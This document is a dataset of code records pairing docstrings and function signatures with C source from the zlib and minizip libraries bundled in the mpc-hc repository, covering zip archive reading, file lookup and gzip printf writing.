pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,\n                                pfile_in_zip_read_info->stream.next_out,\n                                uDoCopy);\n            pfile_in_zip_read_info->rest_read_uncompressed-=uDoCopy;\n            pfile_in_zip_read_info->stream.avail_in -= uDoCopy;\n            pfile_in_zip_read_info->stream.avail_out -= uDoCopy;\n            pfile_in_zip_read_info->stream.next_out += uDoCopy;\n            pfile_in_zip_read_info->stream.next_in += uDoCopy;\n            pfile_in_zip_read_info->stream.total_out += uDoCopy;\n            iRead += uDoCopy;\n        }\n        else if (pfile_in_zip_read_info->compression_method==Z_BZIP2ED)\n        {\n#ifdef HAVE_BZIP2\n            uLong uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            uLong uOutThis;\n\n            pfile_in_zip_read_info->bstream.next_in        = (char*)pfile_in_zip_read_info->stream.next_in;\n            pfile_in_zip_read_info->bstream.avail_in       = pfile_in_zip_read_info->stream.avail_in;\n            pfile_in_zip_read_info->bstream.total_in_lo32  = pfile_in_zip_read_info->stream.total_in;\n            pfile_in_zip_read_info->bstream.total_in_hi32  = 0;\n            pfile_in_zip_read_info->bstream.next_out       = (char*)pfile_in_zip_read_info->stream.next_out;\n            pfile_in_zip_read_info->bstream.avail_out      = pfile_in_zip_read_info->stream.avail_out;\n            pfile_in_zip_read_info->bstream.total_out_lo32 = pfile_in_zip_read_info->stream.total_out;\n            pfile_in_zip_read_info->bstream.total_out_hi32 = 0;\n\n            uTotalOutBefore = pfile_in_zip_read_info->bstream.total_out_lo32;\n            bufBefore = (const Bytef *)pfile_in_zip_read_info->bstream.next_out;\n\n            err=BZ2_bzDecompress(&pfile_in_zip_read_info->bstream);\n\n            uTotalOutAfter = pfile_in_zip_read_info->bstream.total_out_lo32;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,bufBefore, (uInt)(uOutThis));\n            pfile_in_zip_read_info->rest_read_uncompressed -= uOutThis;\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            pfile_in_zip_read_info->stream.next_in   = (Bytef*)pfile_in_zip_read_info->bstream.next_in;\n            pfile_in_zip_read_info->stream.avail_in  = pfile_in_zip_read_info->bstream.avail_in;\n            pfile_in_zip_read_info->stream.total_in  = pfile_in_zip_read_info->bstream.total_in_lo32;\n            pfile_in_zip_read_info->stream.next_out  = (Bytef*)pfile_in_zip_read_info->bstream.next_out;\n            pfile_in_zip_read_info->stream.avail_out = pfile_in_zip_read_info->bstream.avail_out;\n            pfile_in_zip_read_info->stream.total_out = pfile_in_zip_read_info->bstream.total_out_lo32;\n\n            if (err==BZ_STREAM_END)\n              return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=BZ_OK)\n              break;\n#endif\n        } // end Z_BZIP2ED\n        else\n        {\n            ZPOS64_T uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            ZPOS64_T uOutThis;\n            int flush=Z_SYNC_FLUSH;\n\n            uTotalOutBefore = pfile_in_zip_read_info->stream.total_out;\n            bufBefore = pfile_in_zip_read_info->stream.next_out;\n\n            /*\n            if ((pfile_in_zip_read_info->rest_read_uncompressed ==\n                     pfile_in_zip_read_info->stream.avail_out) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                flush = Z_FINISH;\n            */\n            err=inflate(&pfile_in_zip_read_info->stream,flush);\n\n            if ((err>=0) && (pfile_in_zip_read_info->stream.msg!=NULL))\n              err = Z_DATA_ERROR;\n\n            uTotalOutAfter = pfile_in_zip_read_info->stream.total_out;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 =\n                crc32(pfile_in_zip_read_info->crc32,bufBefore,\n                        (uInt)(uOutThis));\n\n            pfile_in_zip_read_info->rest_read_uncompressed -=\n                uOutThis;\n\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            if (err==Z_STREAM_END)\n                return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=Z_OK)\n                break;\n        }\n    }\n\n    if (err==Z_OK)\n        return iRead;\n    return err;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\nRead extra field from the current file (opened by unzOpenCurrentFile)\nThis is the local-header version of the extra field (sometimes, there is\nmore info in the local-header version than in the central-header)\n\n  if buf==NULL, it return the size of the local extra field that can be read\n\n  if buf!=NULL, len is the size of the buffer, the extra header is copied in\n    buf.\n  the return value is the number of bytes copied in buf, or (if <0)\n    the error code\n*/\n", "func_signal": "extern int ZEXPORT unzGetLocalExtrafield (unzFile file, voidp buf, unsigned len)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    uInt read_now;\n    ZPOS64_T size_to_read;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    size_to_read = (pfile_in_zip_read_info->size_local_extrafield -\n                pfile_in_zip_read_info->pos_local_extrafield);\n\n    if (buf==NULL)\n        return (int)size_to_read;\n\n    if (len>size_to_read)\n        read_now = (uInt)size_to_read;\n    else\n        read_now = (uInt)len ;\n\n    if (read_now==0)\n        return 0;\n\n    if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              pfile_in_zip_read_info->offset_local_extrafield +\n              pfile_in_zip_read_info->pos_local_extrafield,\n              ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              buf,read_now)!=read_now)\n        return UNZ_ERRNO;\n\n    return (int)read_now;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/* This table is used to remember the original form of pointers\n * to large buffers (64K). Such pointers are normalized with a zero offset.\n * Since MSDOS is not a preemptive multitasking OS, this table is not\n * protected from concurrent access. This hack doesn't work anyway on\n * a protected system like OS/2. Use Microsoft C instead.\n */\n", "func_signal": "voidpf ZLIB_INTERNAL zcalloc (voidpf opaque, unsigned items, unsigned size)", "code": "{\n    voidpf buf;\n    ulg bsize = (ulg)items*size;\n\n    (void)opaque;\n\n    /* If we allocate less than 65520 bytes, we assume that farmalloc\n     * will return a usable pointer which doesn't have to be normalized.\n     */\n    if (bsize < 65520L) {\n        buf = farmalloc(bsize);\n        if (*(ush*)&buf != 0) return buf;\n    } else {\n        buf = farmalloc(bsize + 16L);\n    }\n    if (buf == NULL || next_ptr >= MAX_PTR) return NULL;\n    table[next_ptr].org_ptr = buf;\n\n    /* Normalize the pointer to seg:0 */\n    *((ush*)&buf+1) += ((ush)((uch*)buf-0) + 15) >> 4;\n    *(ush*)&buf = 0;\n    table[next_ptr++].new_ptr = buf;\n    return buf;\n}", "path": "mpc-hc/src/thirdparty/zlib/zutil.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Close a ZipFile opened with unzOpen.\n  If there is files inside the .Zip opened with unzOpenCurrentFile (see later),\n    these files MUST be closed with unzCloseCurrentFile before call unzClose.\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzClose (unzFile file)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    if (s->pfile_in_zip_read!=NULL)\n        unzCloseCurrentFile(file);\n\n    ZCLOSE64(s->z_filefunc, s->filestream);\n    TRYFREE(s);\n    return UNZ_OK;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzGetGlobalInfo64 (unzFile file, unz_global_info64* pglobal_info)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    *pglobal_info=s->gi;\n    return UNZ_OK;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  return 1 if the end of file was reached, 0 elsewhere\n*/\n", "func_signal": "extern int ZEXPORT unzeof (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    if (pfile_in_zip_read_info->rest_read_uncompressed == 0)\n        return 1;\n    else\n        return 0;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/* -- see zlib.h -- */\n", "func_signal": "int ZEXPORTVA gzvprintf(gzFile file, const char *format, va_list va)", "code": "{\n    int len;\n    unsigned left;\n    char *next;\n    gz_statep state;\n    z_streamp strm;\n\n    /* get internal structure */\n    if (file == NULL)\n        return Z_STREAM_ERROR;\n    state = (gz_statep)file;\n    strm = &(state->strm);\n\n    /* check that we're writing and that there's no error */\n    if (state->mode != GZ_WRITE || state->err != Z_OK)\n        return Z_STREAM_ERROR;\n\n    /* make sure we have some buffer space */\n    if (state->size == 0 && gz_init(state) == -1)\n        return state->err;\n\n    /* check for seek request */\n    if (state->seek) {\n        state->seek = 0;\n        if (gz_zero(state, state->skip) == -1)\n            return state->err;\n    }\n\n    /* do the printf() into the input buffer, put length in len -- the input\n       buffer is double-sized just for this function, so there is guaranteed to\n       be state->size bytes available after the current contents */\n    if (strm->avail_in == 0)\n        strm->next_in = state->in;\n    next = (char *)(state->in + (strm->next_in - state->in) + strm->avail_in);\n    next[state->size - 1] = 0;\n#ifdef NO_vsnprintf\n#  ifdef HAS_vsprintf_void\n    (void)vsprintf(next, format, va);\n    for (len = 0; len < state->size; len++)\n        if (next[len] == 0) break;\n#  else\n    len = vsprintf(next, format, va);\n#  endif\n#else\n#  ifdef HAS_vsnprintf_void\n    (void)vsnprintf(next, state->size, format, va);\n    len = strlen(next);\n#  else\n    len = vsnprintf(next, state->size, format, va);\n#  endif\n#endif\n\n    /* check that printf() results fit in buffer */\n    if (len == 0 || (unsigned)len >= state->size || next[state->size - 1] != 0)\n        return 0;\n\n    /* update buffer and position, compress first half if past that */\n    strm->avail_in += (unsigned)len;\n    state->x.pos += len;\n    if (strm->avail_in >= state->size) {\n        left = strm->avail_in - state->size;\n        strm->avail_in = state->size;\n        if (gz_comp(state, Z_NO_FLUSH) == -1)\n            return state->err;\n        memcpy(state->in, state->in + state->size, left);\n        strm->next_in = state->in;\n        strm->avail_in = left;\n    }\n    return len;\n}", "path": "mpc-hc/src/thirdparty/zlib/gzwrite.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Give the current position in uncompressed data\n*/\n", "func_signal": "extern z_off_t ZEXPORT unztell (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    return (z_off_t)pfile_in_zip_read_info->stream.total_out;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem.\n*/\n", "func_signal": "extern int ZEXPORT unzGetCurrentFileInfo64 (unzFile file,\n                                          unz_file_info64 * pfile_info,\n                                          char * szFileName, uLong fileNameBufferSize,\n                                          void *extraField, uLong extraFieldBufferSize,\n                                          char* szComment,  uLong commentBufferSize)", "code": "{\n    return unz64local_GetCurrentFileInfoInternal(file,pfile_info,NULL,\n                                                szFileName,fileNameBufferSize,\n                                                extraField,extraFieldBufferSize,\n                                                szComment,commentBufferSize);\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Try locate the file szFileName in the zipfile.\n  For the iCaseSensitivity signification, see unzStringFileNameCompare\n\n  return value :\n  UNZ_OK if the file is found. It becomes the current file.\n  UNZ_END_OF_LIST_OF_FILE if the file is not found\n*/\n", "func_signal": "extern int ZEXPORT unzLocateFile (unzFile file, const char *szFileName, int iCaseSensitivity)", "code": "{\n    unz64_s* s;\n    int err;\n\n    /* We remember the 'current' position in the file so that we can jump\n     * back there if we fail.\n     */\n    unz_file_info64 cur_file_infoSaved;\n    unz_file_info64_internal cur_file_info_internalSaved;\n    ZPOS64_T num_fileSaved;\n    ZPOS64_T pos_in_central_dirSaved;\n\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n\n    if (strlen(szFileName)>=UNZ_MAXFILENAMEINZIP)\n        return UNZ_PARAMERROR;\n\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    /* Save the current state */\n    num_fileSaved = s->num_file;\n    pos_in_central_dirSaved = s->pos_in_central_dir;\n    cur_file_infoSaved = s->cur_file_info;\n    cur_file_info_internalSaved = s->cur_file_info_internal;\n\n    err = unzGoToFirstFile(file);\n\n    while (err == UNZ_OK)\n    {\n        char szCurrentFileName[UNZ_MAXFILENAMEINZIP+1];\n        err = unzGetCurrentFileInfo64(file,NULL,\n                                    szCurrentFileName,sizeof(szCurrentFileName)-1,\n                                    NULL,0,NULL,0);\n        if (err == UNZ_OK)\n        {\n            if (unzStringFileNameCompare(szCurrentFileName,\n                                            szFileName,iCaseSensitivity)==0)\n                return UNZ_OK;\n            err = unzGoToNextFile(file);\n        }\n    }\n\n    /* We failed, so restore the state of the 'current file' to where we\n     * were.\n     */\n    s->num_file = num_fileSaved ;\n    s->pos_in_central_dir = pos_in_central_dirSaved ;\n    s->cur_file_info = cur_file_infoSaved;\n    s->cur_file_info_internal = cur_file_info_internalSaved;\n    return err;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Open a Zip file. path contain the full pathname (by example,\n     on a Windows NT computer \"c:\\\\test\\\\zlib114.zip\" or on an Unix computer\n     \"zlib/zlib114.zip\".\n     If the zipfile cannot be opened (file doesn't exist or in not valid), the\n       return value is NULL.\n     Else, the return value is a unzFile Handle, usable with other function\n       of this unzip package.\n*/\n", "func_signal": "local unzFile unzOpenInternal (const void *path,\n                               zlib_filefunc64_32_def* pzlib_filefunc64_32_def,\n                               int is64bitOpenFunction)", "code": "{\n    unz64_s us;\n    unz64_s *s;\n    ZPOS64_T central_pos;\n    uLong   uL;\n\n    uLong number_disk;          /* number of the current dist, used for\n                                   spaning ZIP, unsupported, always 0*/\n    uLong number_disk_with_CD;  /* number the the disk with central dir, used\n                                   for spaning ZIP, unsupported, always 0*/\n    ZPOS64_T number_entry_CD;      /* total number of entries in\n                                   the central dir\n                                   (same than number_entry on nospan) */\n\n    int err=UNZ_OK;\n\n    if (unz_copyright[0]!=' ')\n        return NULL;\n\n    us.z_filefunc.zseek32_file = NULL;\n    us.z_filefunc.ztell32_file = NULL;\n    if (pzlib_filefunc64_32_def==NULL)\n        fill_fopen64_filefunc(&us.z_filefunc.zfile_func64);\n    else\n        us.z_filefunc = *pzlib_filefunc64_32_def;\n    us.is64bitOpenFunction = is64bitOpenFunction;\n\n\n\n    us.filestream = ZOPEN64(us.z_filefunc,\n                                                 path,\n                                                 ZLIB_FILEFUNC_MODE_READ |\n                                                 ZLIB_FILEFUNC_MODE_EXISTING);\n    if (us.filestream==NULL)\n        return NULL;\n\n    central_pos = unz64local_SearchCentralDir64(&us.z_filefunc,us.filestream);\n    if (central_pos)\n    {\n        uLong uS;\n        ZPOS64_T uL64;\n\n        us.isZip64 = 1;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                      central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* size of zip64 end of central directory record */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&uL64)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version made by */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version needed to extract */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory on this disk */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.gi.number_entry)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&number_entry_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.size_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* offset of start of central directory with respect to the\n          starting disk number */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.offset_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        us.gi.size_comment = 0;\n    }\n    else\n    {\n        central_pos = unz64local_SearchCentralDir(&us.z_filefunc,us.filestream);\n        if (central_pos==0)\n            err=UNZ_ERRNO;\n\n        us.isZip64 = 0;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                        central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n            err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central dir on this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.gi.number_entry = uL;\n\n        /* total number of entries in the central dir */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        number_entry_CD = uL;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.size_central_dir = uL;\n\n        /* offset of start of central directory with respect to the\n            starting disk number */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.offset_central_dir = uL;\n\n        /* zipfile comment length */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&us.gi.size_comment)!=UNZ_OK)\n            err=UNZ_ERRNO;\n    }\n\n    if ((central_pos<us.offset_central_dir+us.size_central_dir) &&\n        (err==UNZ_OK))\n        err=UNZ_BADZIPFILE;\n\n    if (err!=UNZ_OK)\n    {\n        ZCLOSE64(us.z_filefunc, us.filestream);\n        return NULL;\n    }\n\n    us.byte_before_the_zipfile = central_pos -\n                            (us.offset_central_dir+us.size_central_dir);\n    us.central_pos = central_pos;\n    us.pfile_in_zip_read = NULL;\n    us.encrypted = 0;\n\n\n    s=(unz64_s*)ALLOC(sizeof(unz64_s));\n    if( s != NULL)\n    {\n        *s=us;\n        unzGoToFirstFile((unzFile)s);\n    }\n    return (unzFile)s;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/* Additions by RX '2004 */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetOffset64(unzFile file)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL)\n          return 0; //UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n      return 0;\n    if (s->gi.number_entry != 0 && s->gi.number_entry != 0xffff)\n      if (s->num_file==s->gi.number_entry)\n         return 0;\n    return s->pos_in_central_dir;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n   Compare two filename (fileName1,fileName2).\n   If iCaseSenisivity = 1, comparision is case sensitivity (like strcmp)\n   If iCaseSenisivity = 2, comparision is not case sensitivity (like strcmpi\n                                                                or strcasecmp)\n   If iCaseSenisivity = 0, case sensitivity is defaut of your operating system\n        (like 1 on Unix, 2 on Windows)\n\n*/\n", "func_signal": "extern int ZEXPORT unzStringFileNameCompare (const char*  fileName1,\n                                                 const char*  fileName2,\n                                                 int iCaseSensitivity)", "code": "{\n    if (iCaseSensitivity==0)\n        iCaseSensitivity=CASESENSITIVITYDEFAULTVALUE;\n\n    if (iCaseSensitivity==1)\n        return strcmp(fileName1,fileName2);\n\n    return STRCMPCASENOSENTIVEFUNCTION(fileName1,fileName2);\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n   Translate date/time from Dos format to tm_unz (readable more easilty)\n*/\n", "func_signal": "local void unz64local_DosDateToTmuDate (ZPOS64_T ulDosDate, tm_unz* ptm)", "code": "{\n    ZPOS64_T uDate;\n    uDate = (ZPOS64_T)(ulDosDate>>16);\n    ptm->tm_mday = (uInt)(uDate&0x1f) ;\n    ptm->tm_mon =  (uInt)((((uDate)&0x1E0)/0x20)-1) ;\n    ptm->tm_year = (uInt)(((uDate&0x0FE00)/0x0200)+1980) ;\n\n    ptm->tm_hour = (uInt) ((ulDosDate &0xF800)/0x800);\n    ptm->tm_min =  (uInt) ((ulDosDate&0x7E0)/0x20) ;\n    ptm->tm_sec =  (uInt) (2*(ulDosDate&0x1f)) ;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/*\n  Read the local header of the current zipfile\n  Check the coherency of the local header and info in the end of central\n        directory about this file\n  store in *piSizeVar the size of extra info in local header\n        (filename and size of extra field data)\n*/\n", "func_signal": "local int unz64local_CheckCurrentFileCoherencyHeader (unz64_s* s, uInt* piSizeVar,\n                                                    ZPOS64_T * poffset_local_extrafield,\n                                                    uInt  * psize_local_extrafield)", "code": "{\n    uLong uMagic,uData,uFlags;\n    uLong size_filename;\n    uLong size_extra_field;\n    int err=UNZ_OK;\n\n    *piSizeVar = 0;\n    *poffset_local_extrafield = 0;\n    *psize_local_extrafield = 0;\n\n    if (ZSEEK64(s->z_filefunc, s->filestream,s->cur_file_info_internal.offset_curfile +\n                                s->byte_before_the_zipfile,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n\n    if (err==UNZ_OK)\n    {\n        if (unz64local_getLong(&s->z_filefunc, s->filestream,&uMagic) != UNZ_OK)\n            err=UNZ_ERRNO;\n        else if (uMagic!=0x04034b50)\n            err=UNZ_BADZIPFILE;\n    }\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n/*\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.wVersion))\n        err=UNZ_BADZIPFILE;\n*/\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uFlags) != UNZ_OK)\n        err=UNZ_ERRNO;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.compression_method))\n        err=UNZ_BADZIPFILE;\n\n    if ((err==UNZ_OK) && (s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n                         (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n                         (s->cur_file_info.compression_method!=Z_DEFLATED))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* date/time */\n        err=UNZ_ERRNO;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* crc */\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.crc) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size compr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.compressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size uncompr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.uncompressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_filename) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (size_filename!=s->cur_file_info.size_filename))\n        err=UNZ_BADZIPFILE;\n\n    *piSizeVar += (uInt)size_filename;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_extra_field) != UNZ_OK)\n        err=UNZ_ERRNO;\n    *poffset_local_extrafield= s->cur_file_info_internal.offset_curfile +\n                                    SIZEZIPLOCALHEADER + size_filename;\n    *psize_local_extrafield = (uInt)size_extra_field;\n\n    *piSizeVar += (uInt)size_extra_field;\n\n    return err;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
{"docstring": "/** Addition for GDAL : START */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetCurrentFileZStreamPos64( unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    s=(unz64_s*)file;\n    if (file==NULL)\n        return 0; //UNZ_PARAMERROR;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n    if (pfile_in_zip_read_info==NULL)\n        return 0; //UNZ_PARAMERROR;\n    return pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile;\n}", "path": "mpc-hc/src/thirdparty/zlib/minizip/unzip.c", "commit_date": "2017-02-25 00:00:00", "repo_name": "mpc-hc/mpc-hc", "stars": 4389, "license": "gpl-3.0", "language": "c", "size": 114821}
